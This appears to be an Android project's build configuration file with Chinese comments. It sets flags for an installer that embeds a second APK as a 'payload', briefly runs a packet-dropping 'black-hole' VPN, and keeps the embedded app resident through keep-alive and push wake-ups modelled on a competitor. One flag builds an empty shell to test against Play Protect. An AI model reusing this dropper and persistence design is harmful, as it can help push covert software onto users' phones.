# A+B：装完/权限就绪后是否关闭黑洞 VPN（0=保持开启，1=装完即关，系统栏钥匙消失）
# B：向导进行中仍会起 VPN；仅 setupCompleted 后生效，且保活不再拉起
# A：B 未就绪时仍会起 VPN；仅 RemoteClientChecker.isReady 后停掉，且不再拉起
#
# 必须为 1。黑洞 VPN 把 com.google.android.gms 加进 addAllowedApplication 后，
# GMS 的 FCM 注册流量进了 TUN，而 TUN 只读不写（纯丢包），实测表现为：
#   FirebaseMessaging: Topic operation failed: SERVICE_NOT_AVAILABLE
# 订阅 Task 永不回调 → 收不到唤醒。关掉 VPN 后同一台机立刻 subscribe 成功、
# 灭屏冻结后也能收到 c2dm 并亮屏。（详见 docs/僵尸唤醒与竞品保活机制-分析报告.md）
#
# 竞品 Minishort 的 PpVpn 同样是临时的：只在安装器 A 前台时建立，
# A.onStop() 立刻 PpVpn.stopVpn()，B 包内根本没有 VpnService。
# 本包身兼安装器与常驻体，只能靠这个开关在 setup 完成后停掉。
STOP_VPN_AFTER_SETUP=1

# A：是否把 B 的 release APK 打进 assets/payload/client.apk（0=不嵌入，1=嵌入，默认 1）
# 0 用于测 Play Protect / 空壳 A；安装页会因缺 payload 失败，属预期
EMBED_CLIENT_APK=1
